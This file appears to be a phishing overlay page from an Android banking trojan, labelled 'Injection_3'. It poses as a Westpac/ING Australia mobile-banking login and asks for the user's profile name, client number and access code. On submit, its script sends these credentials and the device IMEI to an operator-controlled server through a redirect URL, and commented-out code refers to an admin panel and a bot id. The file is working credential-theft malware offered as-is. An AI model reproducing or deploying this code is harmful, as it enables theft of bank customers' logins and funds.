<html>
<head>
<style>
	body {
	 background: #fff;
	color: #000;
	}

	.input {
		background: transparent;
		height: 30px;
		width: 98%;
		border: 0 none;
		border-bottom: 1px solid #000;
		color: #000;
		font-size: 16px;
	}
	
	.fielderror {
		background: transparent;
		height: 30px;
		width: 98%;
		border: 0 none;
		border-bottom: 1px solid #f00;
		color: #000;
		font-size: 16px;
	}
	.submit {
		width: 98%;
		height: 35px;
		border-radius: 6px;
		background: #ff7b06;
		border: 0 none;
		color: #fff;
	}
	
	h4 {
		float: left;
		color: #000;
		padding: 0 0 0 20px;
		margin: 0;
	}
</style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>


<body>
<div id="content_div">
<h4> Enter Your Online Banking log-in details to register for secure Mobile Banking.</h4>
<center><br><br>
		<form action="null" method="post" id="_mainForm" target="flow_handler">
			<input name="Profile name" id="login" placeholder="Profile name" maxlength="15" class="input" type="text"><br><br>
			<input name="Client number" id="security" placeholder="Client number" maxlength="8" class="input" type="text"><br><br>
			<script>
                document.getElementById('security').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
			<input name="Access Code" id="password" placeholder="Access Code" maxlength="6" class="input" type="password"><br><br>
			<script>
                document.getElementById('password').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
			<input value="Log in" id="input_submitBtn" class="submit" type="button">
		 <input type="hidden" name="name" value="WestPac"> 

		</form>
<center>
	<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe> 
</div>
<script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oSecuInp = document.getElementById('security');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oSecuInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 4) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oSecuInp.value.length < 4) {
							try{
								oSecuInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oCodeInp.value.length < 4) {
							try{
								oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "melbourne'+
					'", "profile_name": "'+oNumInp.value+
					'", "client_number": "'+oSecuInp.value+
					'", "access_Code": "'+oCodeInp.value+'"}');
						
						setTimeout(function(){prompt('closeSuccessDialog')}, 7000);
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						var url='<?php echo $URL; ?>';
						var imei_c='<?php echo $IMEI_country; ?>';
						location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|ING Australia Banking|"+oNumInp.value+"|"+oSecuInp.value+"|"+oCodeInp.value);
						
						
						return false;
                    };

                })();
            </script>
</body>
</html>
